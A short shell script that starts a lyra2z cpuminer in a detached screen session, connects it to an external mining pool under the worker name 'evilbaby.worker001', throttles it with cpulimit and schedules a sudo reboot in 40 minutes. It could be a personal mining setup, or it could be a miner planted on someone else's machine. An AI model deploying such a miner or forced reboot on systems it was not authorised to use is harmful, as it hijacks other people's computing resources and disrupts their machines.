#!/bin/sh



if [ -f ${PWD}/cpuminer-xzc/miner.h ]; then
    if pgrep -x "cpuminer" > /dev/null
then
    echo "minerd is running"
else

    echo "minerd has been installed, starting now"
	sudo shutdown -r 40
        cd cpuminer-xzc
    screen -dmSL cpuminer ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.worker001 -p 1; sleep 3
    cpulimit --exe cpuminer --limit 189
     
fi
exit
fi
